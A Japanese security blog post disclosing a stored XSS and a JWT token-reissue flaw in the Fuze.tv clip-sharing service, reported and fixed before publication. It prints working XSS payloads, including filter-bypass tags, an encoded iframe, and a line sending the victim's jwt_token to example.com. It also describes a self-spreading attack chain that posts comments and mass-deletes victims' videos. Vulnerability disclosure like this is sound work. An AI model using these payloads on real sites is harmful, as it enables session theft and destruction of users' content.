---
title: "Fuze.tvに脆弱性を見つけた話"
date: 2021-07-28T18:11:51+09:00
draft: false
categories: [セキュリティ]
tags: ["脆弱性", "XSS"]
---

### TL;DR

Fuze.tv のコメントに蓄積型 XSS を投稿することが可能であり、  
[下記の方法](#攻撃シナリオ)から Fuze.tv を利用する約 55 万人[^1]すべてのユーザーに影響を及ぼすことが可能だった。  
また[JWT の実装不備](#JWTの実装不備)もあり、結果的に完全なサービス妨害に繋げることができた。

[^1]: [ダウンロード数](https://www.overwolf.com/app/fuze_tv-fuze_tv)より推定

![](/fuze.tv-high-impact-xss/1.png)

### Fuze.tv とは

ゲームのクリップを共有するサイト。  
クライアントは Overwolf に依存。

### 調査理由

友達が使っていて面白そうだと思ったので、バグがないか探してみることにした。

### 初期調査

コメントに XSS が投稿できないか WAF を調べてみる。  
すると`<script>`は削除されてしまい、また http/https や href の文字 が `<a href>` タグ に変換されることが分かった。  
次に html タグが埋め込めないか確認したところ XSS が発火。  
このときはまだ限定的な条件下での攻撃と考えていた。

```html
<XSS onpointerup="alert(1)"<h1>XSS</h1></XSS>
```

```html
<div class="comments-content">
    <div compile-content-parser="::$ctrl.item.message">
        <vuln onpointerup="var i=new Image;i.src="http://example.com/?"+123;" class="ng-scope"><h1>Crafted comment</h1>
        </vuln>
    </div>
</div>
```

```html
<video>
  <source onerror=location=/\example.com/+localStorage.getItem("jwt_token")>
</video>
```

![](/fuze.tv-high-impact-xss/2.png)  
![](/fuze.tv-high-impact-xss/3.png)

### Iframe を使った XSS

Content-Security-Policy が設定されておらず、 Iframe から XSS を入力することができた。  
また、エンコードされた文字列が WAF を通過すると判明。  
サニタイジングを回避して制限なしに XSS を発火させることができた。

```html
<iframe src="javascript:alert(document.domain)"></iframe>
```

```html
<script>
  const scheme = ["ht", "tp", "s"];
  const payload = {
    message: "Hello there",
    parentId: "0",
    attachedVideoEntryId: null,
  };
  const param = {
    method: "POST",
    headers: {
      Authorization: localStorage.getItem("jwt_token"),
      Accept: "application/json, text/plain, */*",
      "Content-Type": "application/json;charset=UTF-8",
    },
    body: JSON.stringify(payload),
  };
  fetch(
    scheme.join("") + "://brain.fuze.tv/api/feed/comment/{commentTo}/{paramId}",
    param
  )
    .then((res) => {
      return res.json();
    })
    .then((json) => {
      alert("executed");
    });
</script>

<iframe
  srcdoc="&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x63;&#x6F;
  ...
  &#x3B;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"
>
</iframe>
```

{{< youtube GFQAT_XZqW4 >}}
{{< youtube SZC8QsLz8Mo >}}

### JWT の実装不備

Fuze.tv の アクセストークンは有効期限が 10 分と十分に短いが、  
失効したアクセストークンで API にリクエストを送ると新しいトークンが返ってきていた。  
本来であればリフレッシュトークン[^2]のようなものを使ってアクセストークンを再発行するべきであり、  
また、この際にリフレッシュトークンも再発行することで漏洩のリスクを軽減することができる。

[^2]: https://datatracker.ietf.org/doc/html/rfc6749#section-10.4

```php
GET /api/feed/profile/me/recent/0/down HTTP/1.1
Host: brain.fuze.tv
Connection: close
Accept: application/json, text/plain, */*
Authorization: {Redacted}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Origin: https://fuze.tv
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://fuze.tv/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

```

```php
HTTP/1.1 440 unknown
Date: Fri, 30 Jul 2021 14:15:27 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 429
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: https://fuze.tv
Vary: Origin
Access-Control-Allow-Credentials: true
Newtoken: New-Access-Token
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 676f32fc7f151d73-NRT

{"token":"New-Access-Token"}
```

### 攻撃シナリオ

以下のスクリプトをチェーンとして用意しておく。  
ページを読み込んだユーザーに全てのリクエストを送信させる。

1.ユーザーに表示されるオススメ動画を取得。

```php
/api/feed/foryou
```

2.動画にスクリプトを投稿。被害拡大。

```php
/api/feed/comment/{commentTo}/{paramId}
```

3.ユーザーが動画を投稿しているなら指定された日付が過ぎた後に動画を一斉削除。

```php
/api/feed/profile/me/recent/{itemId}/{direction}
/api/feed/remove/{feedItemId}
```

4.コメント一覧に動画を投稿しているユーザーがいるなら  
 グラフ探索で更に被害を拡大していく。

```php
/public/feed/comments/{feedItemId}/{skip}/{sort}/cached.js
/api/feed/comment/{commentTo}/{paramId}
```

5.ユーザーが動画を投稿しているなら指定された日付が過ぎた後に動画を一斉削除。

```php
/api/feed/profile/me/recent/{itemId}/{direction}
/api/feed/remove/{feedItemId}
```

PoC[^3]

[^3]:
    https://gist.github.com/Lutwidse/d4fff3b428d01c373822d473fac8c72b  
    CORS を回避して攻撃をクライアント側で完結させるため、また投稿可能な文字数の超過を抑えるために、  
    スクリプトをチェーンとしてコメントに投稿した後に`eval`で受け取る方法を選んだ。

{{< youtube vUw7WFaTJ3g >}}

### 簡易的な攻撃シナリオ

[JWT の実装不備](#JWTの実装不備)から、攻撃者自身が自らリクエストを行うことが可能。

1.ユーザーのトークンを盗取する。

```html
<video>
  <source onerror=location=/\example.com/+localStorage.getItem("jwt_token")>
</video>
```

または指定の動画にトークンをコメントとして投稿させる。

```php
/api/feed/comment/{commentTo}/{paramId}
```

2.ユーザーに表示されるオススメ動画を取得。

```php
/api/feed/foryou
```

3.動画にスクリプトを投稿。被害拡大。

```php
/api/feed/comment/{commentTo}/{paramId}
```

4.コメント一覧に動画を投稿しているユーザーがいるなら  
 グラフ探索で更に被害を拡大していく。

```php
/public/feed/comments/{feedItemId}/{skip}/{sort}/cached.js
/api/feed/comment/{commentTo}/{paramId}
```

5.ユーザーが動画を投稿しているなら指定された日付が過ぎた後に動画を一斉削除。

```php
/api/feed/profile/me/recent/{itemId}/{direction}
/api/feed/remove/{feedItemId}
```

### 結論

典型的な脆弱性だからといって修正を怠ると、十分に利用可能な攻撃に繋がる可能性がある。  
脆弱性報告を受けた場合は速やかに対処したほうがよい。

### タイムライン

| UTC(+0900) |             事例             |
| :--------- | :--------------------------: |
| 07/23/2021 |          XSS の確認          |
| 07/23/2021 |      報告・運営から返答      |
| 07/24/2021 |          XSS の確認          |
| 07/24/2021 |             報告             |
| 07/25/2021 |        　 PoC の作成         |
| 07/25/2021 |      報告・運営から返答      |
| 08/02/2021 | 修正されていないため再度連絡 |
| 08/07/2021 |     修正されたことを確認     |
| 08/07/2021 |         本記事の公開         |
